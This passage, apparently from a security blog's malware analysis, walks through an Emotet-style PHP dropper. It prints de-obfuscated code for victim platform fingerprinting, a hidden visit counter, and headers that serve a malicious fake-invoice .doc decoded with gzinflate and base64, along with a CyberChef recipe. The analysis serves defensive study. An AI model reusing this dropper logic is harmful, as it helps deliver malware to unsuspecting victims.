    $qString &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TGhDY1VXdENMUT09OjpRVUVSWV9TVFJJTkc=&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_SERVER[$qString])) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $_SERVER[$qString];
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As we already saw it before, we know that the function will just return the full query string if its not empty. If we go on, we will find:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sha1&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;basename&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;dirname&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;)));

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (($fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;($path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c+&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flock&lt;/span&gt;($fp, &lt;span style=&#34;color:#a6e22e&#34;&gt;LOCK_EX&lt;/span&gt;)) {
	$stat &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;();
        $fileSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;filesize&lt;/span&gt;($path);

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($fileSize &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
	    $stat &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;json_decode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fread&lt;/span&gt;($fp, $fileSize), &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
        }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function will now create a hidden JSON file (it has a &lt;em&gt;&amp;rdquo;.&amp;quot;&lt;/em&gt; at the beginning) having as a filename the SHA-1 hash of the name of the current directory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;	$platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getPlatform&lt;/span&gt;();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($stat[$platform]) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;is_int&lt;/span&gt;($stat[$platform])) {
	    $stat[$platform] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
            $stat[$platform]&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
        }

	&lt;span style=&#34;color:#a6e22e&#34;&gt;fseek&lt;/span&gt;($fp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
	&lt;span style=&#34;color:#a6e22e&#34;&gt;fwrite&lt;/span&gt;($fp, &lt;span style=&#34;color:#a6e22e&#34;&gt;json_encode&lt;/span&gt;($stat));
	&lt;span style=&#34;color:#a6e22e&#34;&gt;fflush&lt;/span&gt;($fp);
	&lt;span style=&#34;color:#a6e22e&#34;&gt;flock&lt;/span&gt;($fp, &lt;span style=&#34;color:#a6e22e&#34;&gt;LOCK_UN&lt;/span&gt;);
    }

    &lt;span style=&#34;color:#a6e22e&#34;&gt;fclose&lt;/span&gt;($fp);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As we can see from the code above, the previously created JSON file is used to count how many instances of different platforms visited the page. The &lt;code&gt;getPlatform()&lt;/code&gt; function contains the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getPlatform&lt;/span&gt;() {
    &lt;span style=&#34;color:#75715e&#34;&gt;// $userAgent = HTTP_USER_AGENT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $userAgent &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SERVER[$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YWV6ejFFekE5TE5NbVE9PTo6SFRUUF9VU0VSX0FHRU5U&amp;#34;&lt;/span&gt;)]) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;
	    $_SERVER[$this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YWV6ejFFekE5TE5NbVE9PTo6SFRUUF9VU0VSX0FHRU5U&amp;#34;&lt;/span&gt;)] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; );
    $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_UNKNOWN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;N3VFR0dla2xiZz09Ojp3aW5kb3dz&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
    $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_WINDOWS -&amp;gt; windows
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;QlFuRXdiZlRKZz09OjppUGFk&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_APPLE -&amp;gt; BQnEwbfTJg==::iPad
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;V1hMdTYyTUw6OmlQb2Q=&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_APPLE -&amp;gt; iPod
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;N1c3WjVYeld1c0lQZmNnPTo6aVBob25l&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_APPLE -&amp;gt; iPhone
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NllXNWhXMk43RzR4UURFPTo6bWFj&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_APPLE -&amp;gt; mac
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;V0RvWnVPZE5CZnpiZFdVZU93PT06OmFuZHJvaWQ=&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_ANDROID -&amp;gt; android
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eVhldjU2RFlYUT09OjpsaW51eA==&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_LINUX -&amp;gt; linux
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TUU0ZmFKekdiRGFPaU42WDo6d2lu&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_WINDOWS -&amp;gt; win
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($userAgent, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cHJoVk9kN291L3FFN0ZxdTo6aU9T&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
        $platform &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// PLATFORM_APPLE -&amp;gt; iOS
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $platform;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I have inserted some comments to make it easier to read, but the piece of code above is used to check the &lt;em&gt;Navigator.platform&lt;/em&gt; attribute which every browser expose to the visited pages. Since we have different options, here is a quick recap of what we will get after the execution of &lt;code&gt;getPlatform()&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;Unkown 	-&amp;gt; 0
Android -&amp;gt; 1
Apple 	-&amp;gt; 2
Linux	-&amp;gt; 3
Windows	-&amp;gt; 4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Unfortunately I was not able to access the original log file in the first screenshot.&lt;/p&gt;
&lt;h3 id=&#34;the-malicious-document&#34;&gt;The malicious document&lt;/h3&gt;
&lt;p&gt;The following steps of &lt;code&gt;index.php&lt;/code&gt; include a long list of headers being set. I have added again some comments to make it easier to read the code below, since the function &lt;code&gt;d5f44d5a7878a4()&lt;/code&gt; is used to de-obfuscate strings while setting almost all the headers.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Resist Varnish-cache
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setcookie&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;uniqid&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// Send cache headers
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// gmdate(&amp;#34;D, d M Y H:i:s&amp;#34; . &amp;#34;GMT&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$timestamp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gmdate&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;N0s4eFRuRTBZMkNlenRiemlpWT06OkQsIGQgTSBZIEg6aTpz&amp;#34;&lt;/span&gt;))
    &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SUZYQlBrOFJ6d20zNFl4cmNFVlY6OiBHTVQ=&amp;#34;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// header(&amp;#34;Cache-Control: no-cache, must-revalidate&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b0taWDZCUDRleW0veVh4WWtXNGQ6OkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGU=&amp;#34;&lt;/span&gt;));

&lt;span style=&#34;color:#75715e&#34;&gt;// header(&amp;#34;Pragma: no-cache&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;U29wSEl0YnRiMEU9OjpQcmFnbWE6IG5vLWNhY2hl&amp;#34;&lt;/span&gt;));

&lt;span style=&#34;color:#75715e&#34;&gt;// header(&amp;#34;Last-Modified:&amp;#34; . $timestamp)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L1VvdkIxND06Okxhc3QtTW9kaWZpZWQ6IA==&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $timestamp);

&lt;span style=&#34;color:#75715e&#34;&gt;// header(&amp;#34;Expires:&amp;#34; . $timestamp)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ZU44eGw1T2N2azlUZ1RUTVhNTU86OkV4cGlyZXM6IA==&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $timestamp);

&lt;span style=&#34;color:#75715e&#34;&gt;// Send content headers
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$contentName &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;INV_O2GT57A7QBKNN7.doc&amp;#39;&lt;/span&gt;;
$contentType &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/msword&amp;#39;&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;// header(&amp;#34;Content-Type:&amp;#34; . $contentType)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RVpCZ041ZW5TWCtYeE00WGhSRlQ6OkNvbnRlbnQtVHlwZTog&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $contentType);

&lt;span style=&#34;color:#75715e&#34;&gt;// header(&amp;#34;Content-Disposition: attachment; filename=&amp;#34; . $contentName&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NUl6QUhHZ2VPcmpnTzJ0VkpZUTQ6OkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSI=&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $contentName &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// header(&amp;#34;Content-Transfer-Encoding: binary&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d5f44d5a7878a4&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ekFUS003Szl3Zz09OjpDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBiaW5hcnk=&amp;#34;&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s also worth noting that the &lt;code&gt;contentName&lt;/code&gt; and &lt;code&gt;contentType&lt;/code&gt; (respectively the filename and the file type) are also specified.&lt;/p&gt;
&lt;p&gt;The only remaining step is to set the actual content of the malicious document file. This content is hardcoded in the &lt;code&gt;$contentData&lt;/code&gt; variable; unfortunately the string is too long to be reported here, but here is a screenshot:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/emotet/maliciouscontent.png&#34;
         alt=&#34;Just few lines of the encoded malicious document&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Just few lines of the encoded malicious document&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The string in &lt;code&gt;$contentData&lt;/code&gt; is then used to create the document as follows:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gzinflate&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;base64_decode&lt;/span&gt;($contentData));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After decoding it with Base64 and inflating the result, the malicious document is ready and the browser used by the victim will prompt the download of a file called &lt;code&gt;INV_O2GT57A7QBKNN7.doc&lt;/code&gt;. I have created the following CyberChef&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt; recipe to replicate this last step from &lt;code&gt;index.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;From_Base64(&amp;#39;A-Za-z0-9+/=&amp;#39;,true)
Raw_Inflate(0,0,&amp;#39;Block&amp;#39;,false,false)
SHA2(&amp;#39;256&amp;#39;)
